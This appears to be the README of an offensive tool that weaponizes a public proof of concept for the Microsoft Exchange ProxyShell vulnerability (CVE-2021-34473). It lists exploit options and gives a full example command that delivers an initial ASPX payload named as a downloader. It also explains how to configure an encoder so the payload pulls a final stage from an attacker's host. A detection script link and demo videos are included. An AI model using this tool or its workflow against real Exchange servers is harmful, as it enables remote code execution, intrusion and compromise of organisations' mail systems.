# ProxyShell2RCE

Weaponized version of https://github.com/dmaasland/proxyshell-poc. Targets CVE-2021-34473.

# Install requirements
```
pip install -r requirements.txt
```

# Usage (proxyshell.py)
* -u : Exchange Hostname/IP (Required)
* -e : Target email (Required)
* -p : Local wsman port (Default: 8000)
* -s : SMTP server to use (Required)
* -m : Email message body (Required)
* -t : TLS {Options: [yes/no]} (Required)
* -a : File attachment (Required)
* -f : From email (Required)
* -n : Subject line (Required)
* -x : Initial payload name [example.aspx] (Required)
```
python3 -u 192.168.38.106 -e administrator@windomain.local -p 5555 -s 192.168.38.106 -m "Hello World" -t no -a ./example.txt -f roman@rrlabs.com -n RandomSubject -x DefNotADownloader.aspx
```

# Usage (encoder.cpp [x86])
Replace the following:
* {1} | Replace this with your hostname/IP of where you are hosting your final payload
* {2} | Replace this with your payload's name on said server
* {3} | Replace this with your preferred output name. This will be how you reach the payload on vulnerable server.
* {4} | Replace this with your preferred attachment name. This will be used in proxyshell.py as '-a'

# Vulnerability Detection
If OWA is found, run the following nmap script against the host.
* https://github.com/GossiTheDog/scanning/blob/main/http-vuln-exchange-proxyshell.nse

# Tools in action
proxyshell.py
* https://youtu.be/Id29lt76IqE

encoder.cpp
* https://youtu.be/fEI8ZvPR4yM